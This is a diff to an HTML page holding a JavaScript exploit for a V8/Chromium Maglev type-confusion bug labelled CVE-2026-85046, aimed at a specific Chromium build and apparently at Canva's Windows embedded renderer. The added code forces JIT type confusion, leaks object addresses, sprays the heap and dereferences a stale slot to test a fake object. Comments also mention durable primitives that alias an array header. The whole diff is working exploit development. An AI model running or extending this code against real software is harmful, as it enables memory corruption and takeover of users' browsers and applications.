@@ -1,7 +1,7 @@
 <!doctype html>
 <html>
   <head>
-    <title>CVE-2026-85046 - Canva Windows reclaim forensic phase A/B v22</title>
+    <title>CVE-2026-85046 - Canva Windows embed self-probe phase A/B v22.1</title>
     <meta charset="UTF-8" />
     <style>
       * {
@@ -83,7 +83,7 @@
   </head>
   <body>
     <h1>
-      CVE-2026-85046 &mdash; Canva Windows Reclaim Forensic v22
+      CVE-2026-85046 &mdash; Canva Windows Embed Self-Probe v22.1
     </h1>
     <p class="dim">
       Bug: Array.prototype.sort inlining &mdash; Maglev
@@ -108,7 +108,7 @@
 
     <div id="output"></div>
     <hr />
-    <p class="dim">Diagnostic chain (v22 does not dereference the stale slot):</p>
+    <p class="dim">Diagnostic chain (v22.1 performs one persisted stale-slot self-probe per fresh renderer):</p>
     <ol class="dim">
       <li>Train Maglev with mixed element kinds ({PACKED_SMI, PACKED})</li>
       <li>
@@ -125,8 +125,8 @@
         old&rarr;young edge &rarr; phase-specific spray with stage canaries
       </li>
       <li>
-        <b>v22 stop point</b> &mdash; pause after each spray stage for a debugger
-        memory snapshot. <code>bad[2]</code> is intentionally never read as an object
+        <b>v22.1 stop point</b> &mdash; one phase, one 8-batch spray, then one controlled
+        <code>bad[2]</code> validation. Attempt metadata is persisted before dereference
       </li>
     </ol>
     <p class="dim">References:</p>
@@ -157,7 +157,7 @@
 
     <script>
       // ============================================================================
-      // CVE-2026-85046 — v22 reclaim forensic diagnostic
+      // CVE-2026-85046 — v22.1 Embed self-probe diagnostic
       // Target: Chromium 150.0.7871.181 (Debian, Linux x64)
       //   V8 cage base is 4GB-aligned => compressed offsets are per-build constants.
       //   Calibrated via gdb (x/4wx on %DebugPrint'd probe arrays):
@@ -178,6 +178,33 @@
       var V22_PHASES = [0, 4];
       var V22_STAGE_BATCHES = 8;
       var V22_CANARY_STRIDE = 16;
+
+      // v22.1: Embed-only self-probe. Each fresh renderer runs exactly one test.
+      // Advance/persist BEFORE bad[2] so a renderer crash is itself diagnostic.
+      var V221_TESTS = [
+        { phase: 0, batches: 8, marker: 30 },
+        { phase: 4, batches: 8, marker: 32 },
+      ];
+
+      function getV221TestIndex() {
+        var raw = null;
+        try { raw = localStorage.getItem("f022-v221-test-index"); } catch (_) {}
+        var idx = Number(raw);
+        if (!Number.isInteger(idx) || idx < 0) idx = 0;
+        return idx;
+      }
+
+      function setV221TestIndex(idx) {
+        try { localStorage.setItem("f022-v221-test-index", String(idx)); } catch (_) {}
+      }
+
+      function resetV221SelfProbe() {
+        setV221TestIndex(0);
+        try { localStorage.removeItem("f022-v221-last"); } catch (_) {}
+        log("[v22.1] self-probe reset; next fresh renderer will test forced phase 0");
+      }
+
+      window.resetV221SelfProbe = resetV221SelfProbe;
 
       // Optional persisted busy-spin after each `debugger;` statement. Useful
       // when attaching an external debugger instead of relying on DevTools.
@@ -219,23 +246,23 @@
       }
 
       try {
-        var previousDiagnostic = localStorage.getItem("f022-v22-last");
-        if (previousDiagnostic) {
+        var previous221 = localStorage.getItem("f022-v221-last");
+        if (previous221) {
           setTimeout(function () {
-            log("[previous v22 diagnostic] " + previousDiagnostic);
+            log("[previous v22.1 attempt] " + previous221);
           }, 10);
         }
 
-        var phaseIdxPreview = getV22PhaseIndex();
+        var testIdxPreview = getV221TestIndex();
         setTimeout(function () {
-          if (phaseIdxPreview < V22_PHASES.length) {
+          if (testIdxPreview < V221_TESTS.length) {
+            var t = V221_TESTS[testIdxPreview];
             log(
-              "[v22] next fresh-renderer test: forced phase " +
-                V22_PHASES[phaseIdxPreview] +
-                ", " + V22_STAGE_BATCHES + " batch(es)/stage",
+              "[v22.1] next fresh-renderer self-probe: forced phase " +
+                t.phase + ", " + t.batches + " batch(es), marker=" + t.marker,
             );
           } else {
-            log("[v22] phase A/B complete. Call resetV22PhaseAB() in DevTools to repeat.");
+            log("[v22.1] phase A/B self-probe complete. Call resetV221SelfProbe() to repeat.");
           }
         }, 15);
       } catch (_) {}
@@ -585,6 +612,122 @@
       }
 
       // ---------------------------------------------------------------------------
+      // v22.1 Embed self-probe: one phase + one spray + one stale-slot dereference.
+      // If bad[2] crashes the renderer, the pre-deref record survives in localStorage
+      // and the next fresh renderer advances to the other phase.
+      // ---------------------------------------------------------------------------
+      function attempt_embed_selfprobe(testIndex, forcedPhase, stageBatches, marker) {
+        var victim = [1.22, 1.33, 1.44];
+        var bad = [{}, {}, 69];
+        bad.pop();
+
+        dbg("      [1] forcing promotion...");
+        trash(1200);
+        trash(1200);
+
+        dbg("      [2] creating young obj + old->young edge...");
+        bad[1] = { x: 420 };
+
+        dbg("      [3] confuse(bad)...");
+        confuse(bad);
+
+        dbg("      [4] unshift (barrier-free move)...");
+        bad.unshift(0);
+
+        var victim_base = addrof_leak(victim);
+        var victim_elems_tagged = ((victim_base - 8) | 1) >>> 0;
+        var slotLeak = Number(String(bad).split(",")[2]);
+        var dead_addr = (slotLeak * 2) >>> 0;
+        var original_pattern = dead_addr & 4 ? 0 : 4;
+        var fakeLenSmi = marker << 1;
+        var canaryLo = forcedPhase === 0 ? V22_S1_CANARY_LO : V22_S3_CANARY_LO;
+        var canaryHi = forcedPhase === 0 ? V22_S1_CANARY_HI : V22_S3_CANARY_HI;
+        var canary = w2f(canaryLo, canaryHi);
+
+        dbg(
+          "      [5] dangling addr=" + hex(dead_addr) +
+            " originalPattern=" + original_pattern +
+            " FORCED phase=" + forcedPhase +
+            " victim=" + hex(victim_base),
+        );
+        dbg(
+          "      [6] single spray: marker=" + marker +
+            " phase=" + forcedPhase +
+            " batches=" + stageBatches,
+        );
+
+        sprayForensicStage(
+          victim_elems_tagged, forcedPhase, stageBatches, fakeLenSmi, canary,
+        );
+
+        var pre = {
+          status: "armed-before-bad2-deref",
+          testIndex: testIndex,
+          forcedPhase: forcedPhase,
+          stageBatches: stageBatches,
+          marker: marker,
+          dead_addr: hex(dead_addr),
+          victim: hex(victim_base),
+          originalPattern: original_pattern,
+          staleRecheck: null,
+          bad2DereferenceAttempted: true,
+        };
+
+        // Re-check the stale numeric slot without treating it as an object.
+        try {
+          var staleAgain = (Number(String(bad).split(",")[2]) * 2) >>> 0;
+          pre.staleRecheck = hex(staleAgain);
+        } catch (_) {}
+
+        try { localStorage.setItem("f022-v221-last", JSON.stringify(pre)); } catch (_) {}
+        dbg("      [7] state persisted; performing ONE bad[2] self-probe now...");
+
+        // This is intentionally the only fragile object dereference in this run.
+        // A native renderer crash is expected to bypass JS try/catch.
+        var candidate = bad[2];
+        var candidateType = typeof candidate;
+        dbg("      [7.1] typeof bad[2]=" + candidateType);
+
+        var observedLength = null;
+        var lengthRead = false;
+        if (candidate !== null && (candidateType === "object" || candidateType === "function")) {
+          observedLength = candidate.length;
+          lengthRead = true;
+          dbg("      [7.2] candidate.length=" + String(observedLength));
+        } else {
+          dbg("      [7.2] no object candidate; length read skipped");
+        }
+
+        var landed = lengthRead && observedLength === marker;
+        var post = {
+          status: landed ? "marker-landed" : "returned-without-marker",
+          testIndex: testIndex,
+          forcedPhase: forcedPhase,
+          stageBatches: stageBatches,
+          marker: marker,
+          dead_addr: hex(dead_addr),
+          victim: hex(victim_base),
+          originalPattern: original_pattern,
+          staleRecheck: pre.staleRecheck,
+          candidateType: candidateType,
+          observedLength: observedLength,
+          markerLanded: landed,
+          bad2DereferenceAttempted: true,
+          headerWriteAttempted: false,
+          fullCageExpansionAttempted: false,
+          nativeCodeExecutionAttempted: false,
+          sandboxEscapeAttempted: false,
+        };
+        try { localStorage.setItem("f022-v221-last", JSON.stringify(post)); } catch (_) {}
+
+        // Drop fragile references immediately; no further fake-object operations.
+        candidate = null;
+        bad = null;
+        victim = null;
+        return post;
+      }
+
+      // ---------------------------------------------------------------------------
       // Durable primitives — master[0]/[1] alias the victim JSArray header words:
       //   master[0] <-> victim [map|properties]
       //   master[1] <-> victim [elements|length]
@@ -726,19 +869,18 @@
           );
         }
 
-        // ================= Step 3: v22 reclaim forensic phase A/B =================
+        // ================= Step 3: v22.1 Embed self-probe phase A/B =================
         log("");
-        log("[*] Step 3: v22 reclaim forensic phase A/B...");
+        log("[*] Step 3: v22.1 Embed self-probe phase A/B...");
 
-        var phaseIndex = getV22PhaseIndex();
-        if (phaseIndex >= V22_PHASES.length) {
-          log("[v22] phase A/B complete: phase 0 and phase 4 were already scheduled.");
-          log("[v22] Call resetV22PhaseAB() in DevTools if you want to repeat.");
+        var testIndex = getV221TestIndex();
+        if (testIndex >= V221_TESTS.length) {
+          log("[v22.1] self-probe complete: forced phase 0 and phase 4 were already scheduled.");
+          log("[v22.1] Call resetV221SelfProbe() if you want to repeat.");
           var completeOut = {
-            outcome: "v22-phase-ab-complete",
+            outcome: "v22.1-phase-ab-complete",
             typeConfusion: true,
             addrof: true,
-            reclaimForensicAttempted: false,
             bad2DereferenceAttempted: false,
             nativeCodeExecutionAttempted: false,
             sandboxEscapeAttempted: false,
@@ -749,50 +891,27 @@
           return;
         }
 
-        var forcedPhase = V22_PHASES[phaseIndex];
+        var test = V221_TESTS[testIndex];
 
-        // Advance before the allocation-heavy diagnostic so a renderer crash does
-        // not repeat the same phase forever. v22 uses its own key; v21 is untouched.
-        setV22PhaseIndex(phaseIndex + 1);
+        // Advance BEFORE the fragile dereference. If Canva's renderer crashes, the
+        // next fresh renderer automatically moves to the other forced phase.
+        setV221TestIndex(testIndex + 1);
 
         log(
-          "    Phase test " + (phaseIndex + 1) + "/" + V22_PHASES.length +
-            ": FORCED phase=" + forcedPhase +
-            ", " + V22_STAGE_BATCHES + " batch(es)/stage (~" +
-            (V22_STAGE_BATCHES * 512) + " KiB/stage)",
+          "    Self-probe " + (testIndex + 1) + "/" + V221_TESTS.length +
+            ": FORCED phase=" + test.phase +
+            ", " + test.batches + " batch(es), marker=" + test.marker,
         );
-        log(
-          "    Canary stride=" + V22_CANARY_STRIDE +
-            " doubles; DevTools `debugger;` pause after each stage.",
-        );
-        log(
-          "    Use setV22Spin(60000) once if an external debugger needs a persisted 60s spin.",
-        );
-        log("    bad[2] will NOT be dereferenced in v22.");
+        log("    Embed-only mode: no DevTools/debugger/memory snapshot required.");
+        log("    Exactly one bad[2] dereference will be attempted after the spray.");
+        log("    Attempt state is persisted before dereference, so a renderer crash is recorded.");
 
-        var result = attempt_reclaim_forensic(V22_STAGE_BATCHES, forcedPhase);
-
-        var out = {
-          outcome: "v22-phase-" + forcedPhase + "-forensic-complete",
-          phaseIndex: phaseIndex,
-          forcedPhase: result.forcedPhase,
-          originalPattern: result.originalPattern,
-          stageBatches: result.stageBatches,
-          approxKiBPerStage: result.stageBatches * 512,
-          deadAddr: hex(result.dead_addr),
-          victim: hex(result.victim_base),
-          canaryStrideDoubles: V22_CANARY_STRIDE,
-          stage1Canary: [hex(V22_S1_CANARY_LO), hex(V22_S1_CANARY_HI)],
-          stage2Canary: [hex(V22_S2_CANARY_LO), hex(V22_S2_CANARY_HI)],
-          stage3Canary: [hex(V22_S3_CANARY_LO), hex(V22_S3_CANARY_HI)],
-          diagnosticOnly: true,
-          bad2DereferenceAttempted: false,
-          fakeobjValidationAttempted: false,
-          headerWriteAttempted: false,
-          fullCageExpansionAttempted: false,
-          nativeCodeExecutionAttempted: false,
-          sandboxEscapeAttempted: false,
-        };
+        var out = attempt_embed_selfprobe(
+          testIndex, test.phase, test.batches, test.marker,
+        );
+        out.outcome = out.markerLanded
+          ? "v22.1-marker-landed"
+          : "v22.1-returned-without-marker";
 
         window.probeResult = out;
         document.getElementById("output").textContent +=
